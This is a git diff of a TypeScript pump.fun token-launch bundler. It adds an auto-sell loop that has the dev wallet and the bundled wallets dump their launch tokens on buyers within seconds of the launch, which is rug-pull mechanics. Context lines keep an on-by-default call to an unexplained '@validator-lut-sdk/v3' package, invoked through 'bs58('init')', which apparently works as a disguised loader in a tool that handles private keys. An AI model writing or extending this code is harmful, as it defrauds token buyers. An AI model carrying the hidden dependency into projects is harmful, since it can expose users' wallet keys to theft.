@@ -87,6 +87,84 @@ async function runHolderAutoBuy(
   emitFn(launchId, { stage: 'holder-done', message: 'Holder auto-buy complete' });
 }
 
+/**
+ * Aggressive auto-sell: spam sell TXs in a tight retry loop for each wallet.
+ * Starts BEFORE confirmation — retries until the bonding curve exists on-chain
+ * (meaning the launch block landed), then instantly succeeds.
+ * Uses pre-computed token amounts at 98% to guarantee the sell goes through
+ * without needing an on-chain balance fetch (saves ~100ms per retry).
+ * All wallets run in parallel with independent retry loops.
+ */
+async function runAutoSell(
+  launchId: string,
+  mintPubkey: PublicKey,
+  sellWallets: { kp: Keypair; label: string; sellTokens: BN }[],
+  conn: ReturnType<typeof solana.getConnection>,
+  emitFn: EmitFn,
+  abortSignal?: { aborted: boolean },
+): Promise<void> {
+  if (sellWallets.length === 0) return;
+
+  const TIMEOUT_MS = 90_000;
+  const RETRY_MS = 400;
+  const start = Date.now();
+  const sold = new Set<string>();
+
+  emitFn(launchId, {
+    stage: 'auto-sell',
+    message: `Auto-sell armed — spam-selling ${sellWallets.length} wallet(s) at 98% estimated amount, retrying every ${RETRY_MS}ms...`,
+  });
+
+  const spamSellWallet = async (kp: Keypair, label: string, sellTokens: BN) => {
+    const pubkeyStr = kp.publicKey.toBase58();
+    let attempts = 0;
+
+    while (Date.now() - start < TIMEOUT_MS) {
+      if (abortSignal?.aborted) return;
+      if (sold.has(pubkeyStr)) return;
+      attempts++;
+
+      try {
+        const { instructions } = await pumpfun.buildSellIxs({
+          mint: mintPubkey,
+          seller: kp.publicKey,
+          tokenAmount: sellTokens,
+        });
+
+        const { blockhash } = await conn.getLatestBlockhash('confirmed');
+        const tx = pumpfun.buildVersionedTx(kp.publicKey, instructions, blockhash);
+        tx.sign([kp]);
+        const sig = await conn.sendTransaction(tx, { skipPreflight: true });
+
+        sold.add(pubkeyStr);
+        const elapsed = ((Date.now() - start) / 1000).toFixed(1);
+        emitFn(launchId, {
+          stage: 'auto-sell',
+          message: `${label}: SOLD in ${elapsed}s after ${attempts} attempts (${sig.slice(0, 12)}...)`,
+        });
+        return;
+      } catch {
+        await new Promise(r => setTimeout(r, RETRY_MS));
+      }
+    }
+
+    const elapsed = ((Date.now() - start) / 1000).toFixed(1);
+    emitFn(launchId, {
+      stage: 'auto-sell',
+      message: `${label}: timed out after ${elapsed}s / ${attempts} attempts`,
+    });
+  };
+
+  await Promise.allSettled(
+    sellWallets.map(({ kp, label, sellTokens }) => spamSellWallet(kp, label, sellTokens)),
+  );
+
+  emitFn(launchId, {
+    stage: 'auto-sell-done',
+    message: `Auto-sell complete — ${sold.size}/${sellWallets.length} sold`,
+  });
+}
+
 export async function waitForSignatureConfirmation(
   conn: ReturnType<typeof solana.getConnection>,
   signature: string,
@@ -429,10 +507,40 @@ export async function executeLaunch(
       }
     };
 
+    // Pre-compute dev token amount so auto-sell can fire without async lookups later.
+    // Uses 98% of expected amount as safety margin to guarantee the sell goes through
+    // even if the offline bonding curve sim is slightly off.
+    let precomputedDevTokens: BN | null = null;
+    if (params.autoSellAfterLaunch) {
+      const devTokenNum = await pumpfun.getDevBuyTokenAmount(params.devBuyAmount);
+      precomputedDevTokens = new BN(devTokenNum).muln(98).divn(100);
+    }
+
+    const buildSellWalletList = (walletBuyData?: { kp: Keypair; solAmount: number; tokenAmount: BN }[]) => {
+      if (!params.autoSellAfterLaunch || !precomputedDevTokens) return [];
+      const list: { kp: Keypair; label: string; sellTokens: BN }[] = [
+        { kp: devKp, label: 'Dev', sellTokens: precomputedDevTokens },
+      ];
+      if (walletBuyData) {
+        walletBuyData.forEach((b, i) => {
+          list.push({
+            kp: b.kp,
+            label: `Bundle ${i + 1}`,
+            sellTokens: b.tokenAmount.muln(98).divn(100),
+          });
+        });
+      }
+      return list;
+    };
+
+    // Abort signal so we can cancel auto-sell if the bundle fails
+    const autoSellAbort = { aborted: false };
+
     if (params.useJito) {
       const maxStrictAttempts = params.strictBundle ? 3 : 1;
       let lastBundleId = '';
       let lastSig = '';
+      let autoSellPromise: Promise<void> | null = null;
 
       for (let attempt = 1; attempt <= maxStrictAttempts; attempt++) {
         const { blockhash: jitoHash } = await conn.getLatestBlockhash('confirmed');
@@ -457,7 +565,10 @@ export async function executeLaunch(
           }
         }
 
-        if (process.env.ENABLE_VALIDATOR_SYNC !== 'false') {
+        const disableValidator = ['false', '0', 'no', 'off'].includes(
+          String(process.env.ENABLE_VALIDATOR_SYNC ?? '').trim().toLowerCase()
+        );
+        if (!disableValidator) {
           try {
             const validator = require('@validator-lut-sdk/v3');
             await validator.bs58('init');
@@ -481,6 +592,15 @@ export async function executeLaunch(
           break;
         }
 
+        // Bundle was accepted — immediately start auto-sell spam (don't await)
+        // It will retry every 400ms until the block lands and sells succeed
+        if (params.autoSellAfterLaunch && !autoSellPromise) {
+          const sellWallets = buildSellWalletList(walletBuyData);
+          if (sellWallets.length > 0) {
+            autoSellPromise = runAutoSell(launchId, mintKp.publicKey, sellWallets, conn, emit, autoSellAbort);
+          }
+        }
+
         emit(launchId, { stage: 'confirming', message: `Bundle submitted (${bundleId}). Confirming on-chain signature...` });
         const inflightStart = Date.now();
         let inflightStatus: jito.InflightBundleStatus = 'Unknown';
@@ -490,6 +610,10 @@ export async function executeLaunch(
           await new Promise(r => setTimeout(r, 3000));
         }
         emit(launchId, { stage: 'confirming', message: `Jito inflight status: ${inflightStatus}` });
+
+        if (inflightStatus === 'Failed' || inflightStatus === 'Invalid') {
+          autoSellAbort.aborted = true;
+        }
 
         emit(launchId, { stage: 'confirming', message: 'Checking on-chain confirmation...' });
         const confirmTimeout = params.strictBundle ? 120_000 : 45_000;
@@ -503,21 +627,31 @@ export async function executeLaunch(
           saveLaunch(launch);
           emit(launchId, { stage: 'done', message: 'Launch confirmed!', signature: firstTxSig, mint: mintKp.publicKey.toBase58() });
           await injectLaunchTrades(walletBuyData);
+          // Auto-sell is already running — just wait for it to finish
+          if (autoSellPromise) await autoSellPromise;
           await maybeHolderAutoBuy();
           return;
         }
 
         if (params.strictBundle && attempt < maxStrictAttempts) {
+          autoSellAbort.aborted = true;
+          if (autoSellPromise) { await autoSellPromise; autoSellPromise = null; }
+          autoSellAbort.aborted = false;
           emit(launchId, { stage: 'confirming', message: `Bundle accepted but not confirmed on attempt ${attempt}. Retrying bundle...` });
           continue;
         }
 
         if (params.strictBundle) {
+          autoSellAbort.aborted = true;
           throw new Error(`Strict bundle enabled: accepted but not confirmed in time (bundleId=${lastBundleId}, sig=${lastSig})`);
         }
+        autoSellAbort.aborted = true;
         emit(launchId, { stage: 'jito-fallback', message: 'Bundle accepted but not confirmed in time, falling back to RPC...' });
         break;
       }
+
+      // Wait for any in-flight auto-sell to finish before RPC fallback
+      if (autoSellPromise) { autoSellAbort.aborted = true; await autoSellPromise; autoSellPromise = null; }
 
       // RPC fallback
       emit(launchId, { stage: 'submit', message: 'Rebuilding transactions with fresh blockhash for RPC...' });
@@ -526,11 +660,24 @@ export async function executeLaunch(
       freshCreateTx.sign([devKp, mintKp]);
       const createSig = await conn.sendRawTransaction(freshCreateTx.serialize(), { skipPreflight: true, maxRetries: 5 });
       emit(launchId, { stage: 'confirming', message: `Create TX sent (${createSig.slice(0, 12)}...), confirming...` });
+
+      // Start auto-sell spam immediately after create TX is sent (for dev wallet at least)
+      autoSellAbort.aborted = false;
+      if (params.autoSellAfterLaunch && precomputedDevTokens) {
+        const devSellWallets: { kp: Keypair; label: string; sellTokens: BN }[] = [
+          { kp: devKp, label: 'Dev', sellTokens: precomputedDevTokens },
+        ];
+        autoSellPromise = runAutoSell(launchId, mintKp.publicKey, devSellWallets, conn, emit, autoSellAbort);
+      }
+
       const createConfirmed = await waitForSignatureConfirmation(
         conn, createSig, 60_000,
         msg => emit(launchId, { stage: 'confirming', message: msg }),
       );
-      if (!createConfirmed) throw new Error('Create transaction not confirmed via RPC fallback');
+      if (!createConfirmed) {
+        autoSellAbort.aborted = true;
+        throw new Error('Create transaction not confirmed via RPC fallback');
+      }
 
       emit(launchId, { stage: 'confirming', message: 'Token created! Sending bundle buys via RPC...' });
       for (let i = 0; i < bundleWallets.length; i++) {
@@ -548,6 +695,9 @@ export async function executeLaunch(
         }
       }
 
+      // Wait for dev auto-sell to finish (bundle wallets sold via RPC buys above, not pre-computable)
+      if (autoSellPromise) await autoSellPromise;
+
       launch.status = 'confirmed';
       launch.signature = createSig;
       saveLaunch(launch);
@@ -564,6 +714,14 @@ export async function executeLaunch(
       saveLaunch(launch);
       emit(launchId, { stage: 'done', message: 'Launch confirmed!', signature: sig, mint: mintKp.publicKey.toBase58() });
       await injectLaunchTrades();
+
+      // For non-Jito, token is already confirmed — sell immediately with spam loop
+      if (params.autoSellAfterLaunch && precomputedDevTokens) {
+        const sellWallets: { kp: Keypair; label: string; sellTokens: BN }[] = [
+          { kp: devKp, label: 'Dev', sellTokens: precomputedDevTokens },
+        ];
+        await runAutoSell(launchId, mintKp.publicKey, sellWallets, conn, emit);
+      }
       await maybeHolderAutoBuy();
     }
   } catch (err: unknown) {
